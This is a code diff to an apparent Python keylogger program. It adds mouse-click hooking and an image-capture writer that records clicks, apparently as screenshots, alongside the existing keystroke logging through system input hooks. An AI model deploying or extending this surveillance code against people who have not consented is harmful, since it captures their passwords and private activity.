@@ -36,6 +36,7 @@ import imp # don't need this anymore?
 from optparse import OptionParser
 import traceback
 from logwriter import LogWriter
+from imagecapture import ImageWriter
 import version
 #import ConfigParser
 from configobj import ConfigObj
@@ -57,15 +58,24 @@ class KeyLogger:
         self.ParseConfigFile()
         self.ParseControlKey()
         self.NagscreenLogic()
-        self.q = Queue.Queue(0)
-        self.lw = LogWriter(self.settings, self.cmdoptions, self.q) 
+        self.q_logwriter = Queue.Queue(0)
+        self.q_imagewriter = Queue.Queue(0)
+        self.lw = LogWriter(self.settings, self.cmdoptions, self.q_logwriter)
+        self.iw = ImageWriter(self.settings, self.cmdoptions, self.q_imagewriter)
         self.hashchecker = ControlKeyMonitor(self.cmdoptions, self.lw, self, self.ControlKeyHash)
-        #if os.name == 'nt':
+        
         self.hm = hooklib.HookManager()
-        self.hm.KeyDown = self.OnKeyDownEvent
-        self.hm.KeyUp = self.OnKeyUpEvent
+        
         if self.settings['General']['Hook Keyboard'] == True:
             self.hm.HookKeyboard()
+            self.hm.KeyDown = self.OnKeyDownEvent
+            self.hm.KeyUp = self.OnKeyUpEvent
+        
+        if self.settings['Image Capture']['Capture Clicks'] == True:
+            self.hm.HookMouse()
+            self.hm.MouseAllButtonsUp = self.OnMouseUpEvent
+            self.hm.MouseAllButtonsDown = lambda x: True # do nothing
+            
         #~ elif os.name == 'posix':
             #~ self.hm = pyxhook.pyxhook(captureclicks = self.settings['Image Capture']['Capture Clicks'], clickimagedimensions = {"width":self.settings['Image Capture']['Capture Clicks Width'], "height":self.settings['Image Capture']['Capture Clicks Height']}, logdir = self.settings['General']['Log Directory'], KeyDown = self.OnKeyDownEvent, KeyUp = self.OnKeyUpEvent)
         
@@ -74,6 +84,7 @@ class KeyLogger:
 
     def start(self):
         self.lw.start()
+        self.iw.start()
         if os.name == 'nt':
             pythoncom.PumpMessages()
         if os.name == 'posix':
@@ -91,7 +102,7 @@ class KeyLogger:
         And passes the event on to the system.
         '''
         
-        self.q.put(event)
+        self.q_logwriter.put(event)
         
         self.ControlKeyHash.update(event)
         
@@ -104,6 +115,10 @@ class KeyLogger:
         self.ControlKeyHash.update(event)
         return True
     
+    def OnMouseUpEvent(self,event):
+        self.q_imagewriter.put(event)
+        return True
+    
     def stop(self):
         '''Exit cleanly.
         '''
@@ -111,6 +126,7 @@ class KeyLogger:
         if os.name == 'posix':
             self.hm.cancel()
         self.lw.cancel()
+        self.iw.cancel()
         self.hashchecker.cancel()
         #print threading.enumerate()
         sys.exit()
